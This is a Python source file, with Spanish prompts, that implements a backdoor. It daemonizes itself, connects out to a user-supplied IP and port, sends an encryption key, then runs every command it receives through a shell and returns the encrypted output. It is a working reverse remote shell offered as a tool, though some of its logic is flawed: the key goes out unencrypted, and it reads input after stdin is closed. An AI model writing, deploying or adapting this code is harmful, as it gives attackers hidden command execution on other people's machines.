import socket
import subprocess
import os
from cryptography.fernet import Fernet
import sys

clave = Fernet.generate_key()
cipher_suite = Fernet(clave)

def backdoor():
    ip = input("Introduce la dirección IP: ")
    puerto = int(input("Introduce el puerto: "))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))

    s.send(clave)

    while True:
        comando_encriptado = s.recv(1024)
        comando = cipher_suite.decrypt(comando_encriptado).decode()

        if comando.lower() == "salir":
            s.close()
            backdoor()
            break
        else:
            proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proceso.stdout.read() + proceso.stderr.read()
            resultado_encriptado = cipher_suite.encrypt(resultado)
            s.send(resultado_encriptado)

def abrir_backdoor():
    if os.path.exists("config.txt"):
        print("La backdoor ya está abierta.")
    else:
        with open("config.txt", "w") as f:
            f.write("abierta")
        print("Backdoor abierta.")

def cerrar_backdoor():
    if os.path.exists("config.txt"):
        os.remove("config.txt")
        print("Backdoor cerrada.")
    else:
        print("La backdoor ya está cerrada.")

if __name__ == '__main__':
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"Error al crear el demonio: {e}")
        sys.exit(1)

    os.chdir("/")
    os.setsid()
    sys.stdin.close()
    sys.stdout.close()
    sys.stderr.close()
    sys.stdin = open(os.devnull, 'r')
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

    if os.path.exists("config.txt"):
        with open("config.txt", "r") as f:
            estado = f.read()
        if estado == "abierta":
            backdoor()
    else:
        respuesta = input("¿Deseas abrir la backdoor? (s/n): ")
        if respuesta.lower() == "s":
            abrir_backdoor()
            backdoor()
        else:
            print("Backdoor no abierta.")